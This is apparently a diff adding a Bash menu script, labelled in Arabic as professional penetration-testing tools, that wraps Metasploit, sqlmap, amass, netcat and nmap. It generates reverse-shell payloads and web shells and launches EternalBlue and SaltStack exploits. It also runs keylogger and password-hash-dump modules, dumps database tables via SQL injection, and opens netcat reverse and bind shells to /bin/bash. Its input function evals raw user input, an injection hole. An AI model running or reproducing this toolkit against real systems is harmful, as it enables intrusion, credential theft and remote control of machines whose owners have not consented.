@@ -1,0 +1,1014 @@
+#!/bin/bash
+
+# ألوان للواجهة
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m' # بدون لون
+
+# متغيرات عامة
+TARGET=""
+PORT=""
+DOMAIN=""
+OUTPUT_FILE=""
+LHOST=""
+LPORT=""
+PAYLOAD=""
+
+# دالة مسح الشاشة وعرض الترويسة
+header() {
+    clear
+    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════╗${NC}"
+    echo -e "${CYAN}║${WHITE}          مجموعة أدوات الاختبار الأمني الاحترافية          ${CYAN}║${NC}"
+    echo -e "${CYAN}║${YELLOW}              Professional Penetration Testing Tools        ${CYAN}║${NC}"
+    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════╝${NC}"
+    echo ""
+}
+
+# دالة الإدخال الآمن
+read_input() {
+    local prompt="$1"
+    local var_name="$2"
+    echo -ne "${GREEN}${prompt}: ${NC}"
+    read input
+    eval $var_name="'$input'"
+}
+
+# دالة تنفيذ الأمر
+execute_command() {
+    local cmd="$1"
+    echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
+    echo -e "${CYAN}الأمر المُنفذ:${NC}"
+    echo -e "${WHITE}$cmd${NC}"
+    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
+    
+    echo -e "${GREEN}هل تريد تنفيذ الأمر؟ (y/n):${NC} "
+    read confirm
+    if [[ $confirm == "y" || $confirm == "Y" ]]; then
+        eval $cmd
+    else
+        echo -e "${RED}تم إلغاء التنفيذ${NC}"
+    fi
+    
+    echo -e "\n${PURPLE}اضغط Enter للمتابعة...${NC}"
+    read
+}
+
+# ═══════════════════════════════════════════════════════════
+# METASPLOIT - إطار العمل الشامل
+# ═══════════════════════════════════════════════════════════
+metasploit_menu() {
+    while true; do
+        header
+        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
+        echo -e "${RED}║${WHITE}         Metasploit Framework           ${RED}║${NC}"
+        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${CYAN}[1]${NC} تشغيل Metasploit Console"
+        echo -e "${CYAN}[2]${NC} البحث عن Exploits"
+        echo -e "${CYAN}[3]${NC} البحث عن Payloads"
+        echo -e "${CYAN}[4]${NC} إنشاء Payload بسيط (msfvenom)"
+        echo -e "${CYAN}[5]${NC} إنشاء Payload متقدم"
+        echo -e "${CYAN}[6]${NC} تشغيل Listener تلقائي"
+        echo -e "${CYAN}[7]${NC} استغلال Windows"
+        echo -e "${CYAN}[8]${NC} استغلال Linux"
+        echo -e "${CYAN}[9]${NC} استغلال تطبيقات الويب"
+        echo -e "${CYAN}[10]${NC} Post-Exploitation Modules"
+        echo -e "${CYAN}[11]${NC} إعداد Handler تلقائي"
+        echo -e "${CYAN}[12]${NC} تشغيل مسح تلقائي"
+        echo -e "${CYAN}[13]${NC} إدارة الجلسات (Sessions)"
+        echo -e "${CYAN}[14]${NC} خيارات مخصصة متقدمة"
+        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
+        echo ""
+        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
+        read choice
+        
+        case $choice in
+            1)
+                CMD="msfconsole"
+                execute_command "$CMD"
+                ;;
+            2)
+                read_input "أدخل كلمة للبحث عن Exploits (مثل: eternalblue)" SEARCH_TERM
+                CMD="msfconsole -x \"search $SEARCH_TERM; exit\""
+                execute_command "$CMD"
+                ;;
+            3)
+                read_input "أدخل نوع النظام (windows/linux/android)" OS_TYPE
+                CMD="msfvenom --list payloads | grep $OS_TYPE | head -20"
+                execute_command "$CMD"
+                ;;
+            4)
+                read_input "أدخل نوع النظام (windows/meterpreter/reverse_tcp)" PAYLOAD
+                read_input "أدخل عنوان IP المهاجم (LHOST)" LHOST
+                read_input "أدخل منفذ الاستماع (LPORT)" LPORT
+                read_input "أدخل اسم ملف الإخراج" OUTPUT_FILE
+                CMD="msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f exe -o $OUTPUT_FILE"
+                execute_command "$CMD"
+                ;;
+            5)
+                echo -e "${YELLOW}أنواع Payloads المتاحة:${NC}"
+                echo "1) Windows Executable"
+                echo "2) Linux ELF"
+                echo "3) Android APK"
+                echo "4) Python Script"
+                echo "5) PHP Web Shell"
+                echo "6) ASPX Web Shell"
+                read_input "اختر النوع" PAYLOAD_TYPE
+                
+                read_input "أدخل عنوان IP المهاجم (LHOST)" LHOST
+                read_input "أدخل منفذ الاستماع (LPORT)" LPORT
+                read_input "أدخل اسم ملف الإخراج" OUTPUT_FILE
+                
+                case $PAYLOAD_TYPE in
+                    1)
+                        CMD="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o $OUTPUT_FILE"
+                        ;;
+                    2)
+                        CMD="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o $OUTPUT_FILE"
+                        ;;
+                    3)
+                        CMD="msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_FILE"
+                        ;;
+                    4)
+                        CMD="msfvenom -p python/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_FILE"
+                        ;;
+                    5)
+                        CMD="msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -o $OUTPUT_FILE"
+                        ;;
+                    6)
+                        CMD="msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o $OUTPUT_FILE"
+                        ;;
+                esac
+                execute_command "$CMD"
+                ;;
+            6)
+                read_input "أدخل عنوان IP المهاجم (LHOST)" LHOST
+                read_input "أدخل منفذ الاستماع (LPORT)" LPORT
+                read_input "أدخل نوع Payload (مثل: windows/meterpreter/reverse_tcp)" PAYLOAD
+                
+                # إنشاء سكريبت تلقائي لـ Metasploit
+                SCRIPT_FILE="/tmp/metasploit_script.rc"
+                echo "use exploit/multi/handler" > $SCRIPT_FILE
+                echo "set PAYLOAD $PAYLOAD" >> $SCRIPT_FILE
+                echo "set LHOST $LHOST" >> $SCRIPT_FILE
+                echo "set LPORT $LPORT" >> $SCRIPT_FILE
+                echo "set ExitOnSession false" >> $SCRIPT_FILE
+                echo "exploit -j -z" >> $SCRIPT_FILE
+                
+                CMD="msfconsole -r $SCRIPT_FILE"
+                echo -e "${CYAN}تم إنشاء سكريبت Metasploit تلقائي في: $SCRIPT_FILE${NC}"
+                execute_command "$CMD"
+                ;;
+            7)
+                read_input "أدخل عنوان الهدف (Windows)" TARGET
+                read_input "أدخل اسم المستخدم (اختياري)" USERNAME
+                read_input "أدخل كلمة المرور (اختياري)" PASSWORD
+                
+                SCRIPT_FILE="/tmp/windows_exploit.rc"
+                echo "use exploit/windows/smb/ms17_010_eternalblue" > $SCRIPT_FILE
+                echo "set RHOSTS $TARGET" >> $SCRIPT_FILE
+                if [[ ! -z "$USERNAME" ]]; then
+                    echo "set SMBUser $USERNAME" >> $SCRIPT_FILE
+                fi
+                if [[ ! -z "$PASSWORD" ]]; then
+                    echo "set SMBPass $PASSWORD" >> $SCRIPT_FILE
+                fi
+                echo "set PAYLOAD windows/x64/meterpreter/reverse_tcp" >> $SCRIPT_FILE
+                echo "set LHOST $(hostname -I | awk '{print $1}')" >> $SCRIPT_FILE
+                echo "set LPORT 4444" >> $SCRIPT_FILE
+                echo "exploit" >> $SCRIPT_FILE
+                
+                CMD="msfconsole -r $SCRIPT_FILE"
+                execute_command "$CMD"
+                ;;
+            8)
+                read_input "أدخل عنوان الهدف (Linux)" TARGET
+                read_input "أدخل المنفذ الهدف" PORT
+                
+                SCRIPT_FILE="/tmp/linux_exploit.rc"
+                echo "use exploit/linux/misc/saltstack_salt_unauth_rce" > $SCRIPT_FILE
+                echo "set RHOSTS $TARGET" >> $SCRIPT_FILE
+                echo "set RPORT $PORT" >> $SCRIPT_FILE
+                echo "set PAYLOAD linux/x64/meterpreter/reverse_tcp" >> $SCRIPT_FILE
+                echo "set LHOST $(hostname -I | awk '{print $1}')" >> $SCRIPT_FILE
+                echo "set LPORT 4444" >> $SCRIPT_FILE
+                echo "exploit" >> $SCRIPT_FILE
+                
+                CMD="msfconsole -r $SCRIPT_FILE"
+                execute_command "$CMD"
+                ;;
+            9)
+                read_input "أدخل عنوان URL الهدف" TARGET
+                read_input "أدخل نوع الثغرة (مثل: struts2/rest_xstream)" VULN_TYPE
+                
+                SCRIPT_FILE="/tmp/web_exploit.rc"
+                echo "use exploit/multi/http/${VULN_TYPE}" > $SCRIPT_FILE
+                echo "set RHOSTS $(echo $TARGET | cut -d'/' -f3)" >> $SCRIPT_FILE
+                echo "set TARGETURI /" >> $SCRIPT_FILE
+                echo "set PAYLOAD java/meterpreter/reverse_tcp" >> $SCRIPT_FILE
+                echo "set LHOST $(hostname -I | awk '{print $1}')" >> $SCRIPT_FILE
+                echo "set LPORT 4444" >> $SCRIPT_FILE
+                echo "exploit" >> $SCRIPT_FILE
+                
+                CMD="msfconsole -r $SCRIPT_FILE"
+                execute_command "$CMD"
+                ;;
+            10)
+                echo -e "${YELLOW}Post-Exploitation Modules:${NC}"
+                echo "1) جمع المعلومات من الجلسة"
+                echo "2) تصعيد الصلاحيات"
+                echo "3) نقل الملفات"
+                echo "4) keylogger"
+                echo "5) dump passwords"
+                read_input "اختر النوع" POST_TYPE
+                
+                SCRIPT_FILE="/tmp/post_exploit.rc"
+                case $POST_TYPE in
+                    1)
+                        echo "run post/multi/gather/env" > $SCRIPT_FILE
+                        echo "run post/multi/gather/checkvm" >> $SCRIPT_FILE
+                        ;;
+                    2)
+                        echo "run post/multi/recon/local_exploit_suggester" > $SCRIPT_FILE
+                        ;;
+                    3)
+                        read_input "أدخل المسار المحلي للملف" LOCAL_FILE
+                        read_input "أدخل المسار الهدف" REMOTE_FILE
+                        echo "upload $LOCAL_FILE $REMOTE_FILE" > $SCRIPT_FILE
+                        ;;
+                    4)
+                        echo "run post/windows/capture/keylog" > $SCRIPT_FILE
+                        ;;
+                    5)
+                        echo "run post/windows/gather/hashdump" > $SCRIPT_FILE
+                        ;;
+                esac
+                echo "sessions -l" >> $SCRIPT_FILE
+                CMD="msfconsole -r $SCRIPT_FILE"
+                execute_command "$CMD"
+                ;;
+            11)
+                read_input "أدخل عنوان IP المهاجم (LHOST)" LHOST
+                read_input "أدخل منفذ الاستماع (LPORT)" LPORT
+                read_input "أدخل نوع Payload" PAYLOAD
+                
+                echo -e "${CYAN}إنشاء Handler تلقائي...${NC}"
+                echo "use exploit/multi/handler" > /tmp/handler.rc
+                echo "set PAYLOAD $PAYLOAD" >> /tmp/handler.rc
+                echo "set LHOST $LHOST" >> /tmp/handler.rc
+                echo "set LPORT $LPORT" >> /tmp/handler.rc
+                echo "set ExitOnSession false" >> /tmp/handler.rc
+                echo "exploit -j" >> /tmp/handler.rc
+                
+                CMD="msfconsole -r /tmp/handler.rc"
+                execute_command "$CMD"
+                ;;
+            12)
+                read_input "أدخل عنوان الهدف" TARGET
+                read_input "أدخل نطاق المنافذ (مثل: 1-1000)" PORTS
+                
+                SCRIPT_FILE="/tmp/auto_scan.rc"
+                echo "use auxiliary/scanner/portscan/tcp" > $SCRIPT_FILE
+                echo "set RHOSTS $TARGET" >> $SCRIPT_FILE
+                echo "set PORTS $PORTS" >> $SCRIPT_FILE
+                echo "run" >> $SCRIPT_FILE
+                echo "use auxiliary/scanner/smb/smb_version" >> $SCRIPT_FILE
+                echo "set RHOSTS $TARGET" >> $SCRIPT_FILE
+                echo "run" >> $SCRIPT_FILE
+                
+                CMD="msfconsole -r $SCRIPT_FILE"
+                execute_command "$CMD"
+                ;;
+            13)
+                echo -e "${YELLOW}إدارة الجلسات:${NC}"
+                echo "1) عرض الجلسات النشطة"
+                echo "2) التفاعل مع جلسة"
+                echo "3) إنهاء جلسة"
+                read_input "اختر الخيار" SESSION_OPT
+                
+                SCRIPT_FILE="/tmp/session_mgmt.rc"
+                case $SESSION_OPT in
+                    1)
+                        echo "sessions -l" > $SCRIPT_FILE
+                        ;;
+                    2)
+                        read_input "أدخل رقم الجلسة" SESSION_ID
+                        echo "sessions -i $SESSION_ID" > $SCRIPT_FILE
+                        ;;
+                    3)
+                        read_input "أدخل رقم الجلسة لإنهائها" SESSION_ID
+                        echo "sessions -k $SESSION_ID" > $SCRIPT_FILE
+                        ;;
+                esac
+                CMD="msfconsole -r $SCRIPT_FILE"
+                execute_command "$CMD"
+                ;;
+            14)
+                read_input "أدخل اسم Module (مثل: exploit/windows/smb/...)" MODULE
+                read_input "أدخل RHOSTS" RHOSTS
+                read_input "أدخل RPORT (اختياري)" RPORT
+                read_input "أدخل PAYLOAD" PAYLOAD
+                read_input "أدخل LHOST" LHOST
+                read_input "أدخل LPORT" LPORT
+                
+                SCRIPT_FILE="/tmp/custom_exploit.rc"
+                echo "use $MODULE" > $SCRIPT_FILE
+                echo "set RHOSTS $RHOSTS" >> $SCRIPT_FILE
+                [[ ! -z "$RPORT" ]] && echo "set RPORT $RPORT" >> $SCRIPT_FILE
+                echo "set PAYLOAD $PAYLOAD" >> $SCRIPT_FILE
+                echo "set LHOST $LHOST" >> $SCRIPT_FILE
+                echo "set LPORT $LPORT" >> $SCRIPT_FILE
+                echo "exploit" >> $SCRIPT_FILE
+                
+                CMD="msfconsole -r $SCRIPT_FILE"
+                execute_command "$CMD"
+                ;;
+            0)
+                return
+                ;;
+            *)
+                echo -e "${RED}خيار غير صحيح!${NC}"
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+# ═══════════════════════════════════════════════════════════
+# SQLMAP - فحص ثغرات SQL
+# ═══════════════════════════════════════════════════════════
+sqlmap_menu() {
+    while true; do
+        header
+        echo -e "${RED}╔═══════════════════════════════════════╗${NC}"
+        echo -e "${RED}║${WHITE}           SQLMap - حقن SQL            ${RED}║${NC}"
+        echo -e "${RED}╚═══════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${CYAN}[1]${NC} فحص أساسي على URL"
+        echo -e "${CYAN}[2]${NC} فحص مع بيانات POST"
+        echo -e "${CYAN}[3]${NC} استخراج قواعد البيانات (--dbs)"
+        echo -e "${CYAN}[4]${NC} استخراج جداول قاعدة بيانات معينة"
+        echo -e "${CYAN}[5]${NC} استخراج أعمدة جدول معين"
+        echo -e "${CYAN}[6]${NC} استخراج بيانات جدول (dump)"
+        echo -e "${CYAN}[7]${NC} فحص متقدم (Level 5, Risk 3)"
+        echo -e "${CYAN}[8]${NC} فحص مع Tamper Scripts"
+        echo -e "${CYAN}[9]${NC} فحص مع Cookie مخصص"
+        echo -e "${CYAN}[10]${NC} خيارات مخصصة متقدمة"
+        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
+        echo ""
+        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
+        read choice
+        
+        case $choice in
+            1)
+                read_input "أدخل URL الهدف" TARGET
+                CMD="sqlmap -u \"$TARGET\" --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            2)
+                read_input "أدخل URL الهدف" TARGET
+                read_input "أدخل بيانات POST (مثل: username=admin&password=123)" POST_DATA
+                CMD="sqlmap -u \"$TARGET\" --data=\"$POST_DATA\" --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            3)
+                read_input "أدخل URL الهدف" TARGET
+                CMD="sqlmap -u \"$TARGET\" --dbs --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            4)
+                read_input "أدخل URL الهدف" TARGET
+                read_input "أدخل اسم قاعدة البيانات" DB_NAME
+                CMD="sqlmap -u \"$TARGET\" -D $DB_NAME --tables --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            5)
+                read_input "أدخل URL الهدف" TARGET
+                read_input "أدخل اسم قاعدة البيانات" DB_NAME
+                read_input "أدخل اسم الجدول" TABLE_NAME
+                CMD="sqlmap -u \"$TARGET\" -D $DB_NAME -T $TABLE_NAME --columns --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            6)
+                read_input "أدخل URL الهدف" TARGET
+                read_input "أدخل اسم قاعدة البيانات" DB_NAME
+                read_input "أدخل اسم الجدول" TABLE_NAME
+                CMD="sqlmap -u \"$TARGET\" -D $DB_NAME -T $TABLE_NAME --dump --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            7)
+                read_input "أدخل URL الهدف" TARGET
+                CMD="sqlmap -u \"$TARGET\" --level=5 --risk=3 --batch --random-agent --threads=10"
+                execute_command "$CMD"
+                ;;
+            8)
+                read_input "أدخل URL الهدف" TARGET
+                echo -e "${YELLOW}Tamper Scripts الشائعة:${NC}"
+                echo "1) space2comment  2) space2plus  3) between  4) charencode"
+                read_input "أدخل اسم Tamper Script" TAMPER
+                CMD="sqlmap -u \"$TARGET\" --tamper=$TAMPER --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            9)
+                read_input "أدخل URL الهدف" TARGET
+                read_input "أدخل Cookie (مثل: PHPSESSID=abc123)" COOKIE
+                CMD="sqlmap -u \"$TARGET\" --cookie=\"$COOKIE\" --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            10)
+                read_input "أدخل URL الهدف" TARGET
+                read_input "أدخل Level (1-5)" LEVEL
+                read_input "أدخل Risk (1-3)" RISK
+                read_input "أدخل عدد Threads" THREADS
+                read_input "أدخل Technique (مثل: BEUSTQ)" TECHNIQUE
+                CMD="sqlmap -u \"$TARGET\" --level=$LEVEL --risk=$RISK --threads=$THREADS --technique=$TECHNIQUE --batch --random-agent"
+                execute_command "$CMD"
+                ;;
+            0)
+                return
+                ;;
+            *)
+                echo -e "${RED}خيار غير صحيح!${NC}"
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+# ═══════════════════════════════════════════════════════════
+# AMASS - استكشاف النطاقات
+# ═══════════════════════════════════════════════════════════
+amass_menu() {
+    while true; do
+        header
+        echo -e "${BLUE}╔═══════════════════════════════════════╗${NC}"
+        echo -e "${BLUE}║${WHITE}      AMASS - استكشاف النطاقات        ${BLUE}║${NC}"
+        echo -e "${BLUE}╚═══════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${CYAN}[1]${NC} استكشاف سلبي (Passive Enumeration)"
+        echo -e "${CYAN}[2]${NC} استكشاف نشط (Active Enumeration)"
+        echo -e "${CYAN}[3]${NC} استكشاف مع القوة الغاشمة (Brute Force)"
+        echo -e "${CYAN}[4]${NC} استكشاف شامل (Passive + Active + Brute)"
+        echo -e "${CYAN}[5]${NC} استكشاف مع حفظ النتائج"
+        echo -e "${CYAN}[6]${NC} استكشاف مع عرض عناوين IP"
+        echo -e "${CYAN}[7]${NC} استخبارات النطاق (Intel Mode)"
+        echo -e "${CYAN}[8]${NC} استكشاف متعدد النطاقات"
+        echo -e "${CYAN}[9]${NC} استكشاف مع تحديد المصادر"
+        echo -e "${CYAN}[10]${NC} خيارات مخصصة متقدمة"
+        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
+        echo ""
+        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
+        read choice
+        
+        case $choice in
+            1)
+                read_input "أدخل اسم النطاق (مثل: example.com)" DOMAIN
+                CMD="amass enum -passive -d $DOMAIN"
+                execute_command "$CMD"
+                ;;
+            2)
+                read_input "أدخل اسم النطاق" DOMAIN
+                CMD="amass enum -active -d $DOMAIN"
+                execute_command "$CMD"
+                ;;
+            3)
+                read_input "أدخل اسم النطاق" DOMAIN
+                CMD="amass enum -brute -d $DOMAIN"
+                execute_command "$CMD"
+                ;;
+            4)
+                read_input "أدخل اسم النطاق" DOMAIN
+                CMD="amass enum -active -brute -d $DOMAIN"
+                execute_command "$CMD"
+                ;;
+            5)
+                read_input "أدخل اسم النطاق" DOMAIN
+                read_input "أدخل اسم ملف الإخراج" OUTPUT_FILE
+                CMD="amass enum -passive -d $DOMAIN -o $OUTPUT_FILE"
+                execute_command "$CMD"
+                ;;
+            6)
+                read_input "أدخل اسم النطاق" DOMAIN
+                CMD="amass enum -passive -d $DOMAIN -ip"
+                execute_command "$CMD"
+                ;;
+            7)
+                read_input "أدخل اسم النطاق للاستخبارات" DOMAIN
+                CMD="amass intel -d $DOMAIN"
+                execute_command "$CMD"
+                ;;
+            8)
+                echo -e "${YELLOW}أدخل النطاقات مفصولة بفواصل (مثل: site1.com,site2.com)${NC}"
+                read_input "النطاقات" DOMAINS
+                CMD="amass enum -passive -d $DOMAINS"
+                execute_command "$CMD"
+                ;;
+            9)
+                read_input "أدخل اسم النطاق" DOMAIN
+                echo -e "${YELLOW}المصادر المتاحة: crtsh,hackertarget,virustotal,etc${NC}"
+                read_input "أدخل المصادر مفصولة بفواصل" SOURCES
+                CMD="amass enum -passive -d $DOMAIN -src $SOURCES"
+                execute_command "$CMD"
+                ;;
+            10)
+                read_input "أدخل اسم النطاق" DOMAIN
+                read_input "Timeout بالدقائق (0 للامحدود)" TIMEOUT
+                read_input "أقصى عدد لاستعلامات DNS (0 للامحدود)" MAX_DNS
+                CMD="amass enum -d $DOMAIN -timeout $TIMEOUT -max-dns-queries $MAX_DNS -active"
+                execute_command "$CMD"
+                ;;
+            0)
+                return
+                ;;
+            *)
+                echo -e "${RED}خيار غير صحيح!${NC}"
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+# ═══════════════════════════════════════════════════════════
+# NETCAT - أداة الشبكات
+# ═══════════════════════════════════════════════════════════
+netcat_menu() {
+    while true; do
+        header
+        echo -e "${GREEN}╔═══════════════════════════════════════╗${NC}"
+        echo -e "${GREEN}║${WHITE}        NETCAT - أداة الشبكات          ${GREEN}║${NC}"
+        echo -e "${GREEN}╚═══════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${CYAN}[1]${NC} الاتصال بمنفذ (Connect)"
+        echo -e "${CYAN}[2]${NC} الاستماع على منفذ (Listen)"
+        echo -e "${CYAN}[3]${NC} فحص منفذ واحد"
+        echo -e "${CYAN}[4]${NC} فحص نطاق منافذ"
+        echo -e "${CYAN}[5]${NC} جلب Banner من خدمة"
+        echo -e "${CYAN}[6]${NC} نقل ملف (الإرسال)"
+        echo -e "${CYAN}[7]${NC} استقبال ملف"
+        echo -e "${CYAN}[8]${NC} Reverse Shell - Listener"
+        echo -e "${CYAN}[9]${NC} Reverse Shell - Connector"
+        echo -e "${CYAN}[10]${NC} Bind Shell"
+        echo -e "${CYAN}[11]${NC} UDP Connection"
+        echo -e "${CYAN}[12]${NC} Chat بين جهازين"
+        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
+        echo ""
+        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
+        read choice
+        
+        case $choice in
+            1)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                read_input "أدخل رقم المنفذ" PORT
+                CMD="nc -v $TARGET $PORT"
+                execute_command "$CMD"
+                ;;
+            2)
+                read_input "أدخل رقم المنفذ للاستماع عليه" PORT
+                CMD="nc -lvp $PORT"
+                execute_command "$CMD"
+                ;;
+            3)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                read_input "أدخل رقم المنفذ" PORT
+                CMD="nc -zv $TARGET $PORT"
+                execute_command "$CMD"
+                ;;
+            4)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                read_input "أدخل المنفذ الأول" PORT_START
+                read_input "أدخل المنفذ الأخير" PORT_END
+                CMD="nc -zv $TARGET $PORT_START-$PORT_END 2>&1 | grep succeeded"
+                execute_command "$CMD"
+                ;;
+            5)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                read_input "أدخل رقم المنفذ" PORT
+                CMD="echo \"\" | nc -v $TARGET $PORT"
+                execute_command "$CMD"
+                ;;
+            6)
+                read_input "أدخل IP الجهاز المستقبل" TARGET
+                read_input "أدخل رقم المنفذ" PORT
+                read_input "أدخل مسار الملف المراد إرساله" FILE
+                CMD="nc $TARGET $PORT < $FILE"
+                echo -e "${YELLOW}تأكد من تشغيل: nc -lvp $PORT > received_file على الجهاز المستقبل${NC}"
+                execute_command "$CMD"
+                ;;
+            7)
+                read_input "أدخل رقم المنفذ للاستماع عليه" PORT
+                read_input "أدخل اسم الملف للحفظ" FILE
+                CMD="nc -lvp $PORT > $FILE"
+                echo -e "${YELLOW}على الجهاز المرسل نفذ: nc <your_ip> $PORT < file_to_send${NC}"
+                execute_command "$CMD"
+                ;;
+            8)
+                read_input "أدخل رقم المنفذ للاستماع" PORT
+                CMD="nc -lvp $PORT"
+                echo -e "${YELLOW}على الجهاز الهدف نفذ: nc <your_ip> $PORT -e /bin/bash${NC}"
+                execute_command "$CMD"
+                ;;
+            9)
+                read_input "أدخل IP المهاجم (Listener)" TARGET
+                read_input "أدخل رقم المنفذ" PORT
+                CMD="nc $TARGET $PORT -e /bin/bash"
+                echo -e "${YELLOW}تأكد من تشغيل listener على: nc -lvp $PORT${NC}"
+                execute_command "$CMD"
+                ;;
+            10)
+                read_input "أدخل رقم المنفذ" PORT
+                CMD="nc -lvp $PORT -e /bin/bash"
+                echo -e "${YELLOW}للاتصال من جهاز آخر: nc <target_ip> $PORT${NC}"
+                execute_command "$CMD"
+                ;;
+            11)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                read_input "أدخل رقم المنفذ" PORT
+                CMD="nc -u $TARGET $PORT"
+                execute_command "$CMD"
+                ;;
+            12)
+                echo -e "${YELLOW}للدردشة بين جهازين:${NC}"
+                echo -e "${CYAN}الجهاز الأول (Server): nc -lvp <port>${NC}"
+                echo -e "${CYAN}الجهاز الثاني (Client): nc <ip> <port>${NC}"
+                read_input "أدخل رقم المنفذ" PORT
+                echo -e "${GREEN}[1] Server Mode  [2] Client Mode${NC}"
+                read mode
+                if [ "$mode" == "1" ]; then
+                    CMD="nc -lvp $PORT"
+                else
+                    read_input "أدخل IP الخادم" TARGET
+                    CMD="nc $TARGET $PORT"
+                fi
+                execute_command "$CMD"
+                ;;
+            0)
+                return
+                ;;
+            *)
+                echo -e "${RED}خيار غير صحيح!${NC}"
+                sleep 1
+                ;;
+        esac
+    done
+}
+
+# ═══════════════════════════════════════════════════════════
+# NMAP - فحص الشبكات
+# ═══════════════════════════════════════════════════════════
+nmap_menu() {
+    while true; do
+        header
+        echo -e "${PURPLE}╔═══════════════════════════════════════╗${NC}"
+        echo -e "${PURPLE}║${WHITE}        NMAP - فحص الشبكات            ${PURPLE}║${NC}"
+        echo -e "${PURPLE}╚═══════════════════════════════════════╝${NC}"
+        echo ""
+        echo -e "${CYAN}[1]${NC} فحص سريع (Fast Scan)"
+        echo -e "${CYAN}[2]${NC} فحص TCP SYN (-sS)"
+        echo -e "${CYAN}[3]${NC} فحص TCP Connect (-sT)"
+        echo -e "${CYAN}[4]${NC} فحص UDP (-sU)"
+        echo -e "${CYAN}[5]${NC} كشف إصدارات الخدمات (-sV)"
+        echo -e "${CYAN}[6]${NC} كشف نظام التشغيل (-O)"
+        echo -e "${CYAN}[7]${NC} فحص شامل (-A)"
+        echo -e "${CYAN}[8]${NC} فحص جميع المنافذ (1-65535)"
+        echo -e "${CYAN}[9]${NC} فحص منافذ محددة"
+        echo -e "${CYAN}[10]${NC} فحص أشهر 1000 منفذ"
+        echo -e "${CYAN}[11]${NC} فحص الثغرات (NSE Vuln Scripts)"
+        echo -e "${CYAN}[12]${NC} السكريبتات الافتراضية (-sC)"
+        echo -e "${CYAN}[13]${NC} فحص بسرعات مختلفة (T0-T5)"
+        echo -e "${CYAN}[14]${NC} فحص شبكة كاملة"
+        echo -e "${CYAN}[15]${NC} كشف الأجهزة النشطة فقط"
+        echo -e "${CYAN}[16]${NC} خيارات مخصصة متقدمة"
+        echo -e "${CYAN}[0]${NC} رجوع للقائمة الرئيسية"
+        echo ""
+        echo -ne "${GREEN}اختر رقم الخيار: ${NC}"
+        read choice
+        
+        case $choice in
+            1)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="nmap -F $TARGET"
+                execute_command "$CMD"
+                ;;
+            2)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="sudo nmap -sS $TARGET"
+                execute_command "$CMD"
+                ;;
+            3)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="nmap -sT $TARGET"
+                execute_command "$CMD"
+                ;;
+            4)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="sudo nmap -sU $TARGET"
+                execute_command "$CMD"
+                ;;
+            5)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="nmap -sV $TARGET"
+                execute_command "$CMD"
+                ;;
+            6)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="sudo nmap -O $TARGET"
+                execute_command "$CMD"
+                ;;
+            7)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="sudo nmap -A -T4 $TARGET"
+                execute_command "$CMD"
+                ;;
+            8)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="nmap -p- $TARGET"
+                execute_command "$CMD"
+                ;;
+            9)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                read_input "أدخل المنافذ (مثل: 80,443,8080 أو 1-1000)" PORTS
+                CMD="nmap -p $PORTS $TARGET"
+                execute_command "$CMD"
+                ;;
+            10)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="nmap --top-ports 1000 $TARGET"
+                execute_command "$CMD"
+                ;;
+            11)
+                read_input "أدخل IP/Hostname الهدف" TARGET
+                CMD="nmap --script vuln $TARGET"
+                execute_command "$CMD"
+                ;;
+            12)
